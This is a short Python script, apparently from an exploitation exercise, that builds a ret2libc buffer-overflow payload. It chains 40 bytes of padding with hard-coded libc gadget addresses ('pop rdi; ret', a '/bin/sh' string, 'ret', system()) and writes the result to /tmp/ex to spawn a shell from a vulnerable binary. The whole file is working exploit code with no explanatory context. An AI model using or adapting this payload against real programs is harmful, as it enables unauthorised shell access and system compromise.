from struct import pack

filler = b"A" * 40
poprdi = pack("<Q", 0x7FFFF7E057E5)  # pop rdi; ret
binsh = pack("<Q", 0x7FFFF7F74031)  # /bin/sh
ret = pack("<Q", 0x7FFFF7E04E99)  # ret
system = pack("<Q", 0x7FFFF7E2A490)  # system()

f = open("/tmp/ex", "wb")
f.write(filler + poprdi + binsh + ret + system + b"\n")
f.close()
